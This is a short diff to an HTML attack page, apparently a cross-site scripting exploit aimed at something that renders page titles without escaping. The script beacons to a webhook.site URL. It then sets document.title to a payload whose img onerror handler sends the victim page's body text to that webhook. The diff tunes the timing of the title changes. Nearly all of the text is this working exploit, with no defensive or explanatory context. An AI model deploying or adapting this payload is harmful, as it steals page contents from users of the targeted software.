@@ -4,11 +4,16 @@
     <p>Loading</p>
     <script>
         (new Image()).src = "https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?d=test";
+
         const payload = `</h1><img src=x onerror="(new Image()).src='https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?d='+encodeURIComponent(document.body.innerText)"><h1>`;
-        
+
+        setTimeout(() => {
+            document.title = "Init";
+        }, 300);
+
         setTimeout(() => {
             document.title = payload;
-        }, 2000);
+        }, 1200);
     </script>
 </body>
 </html>
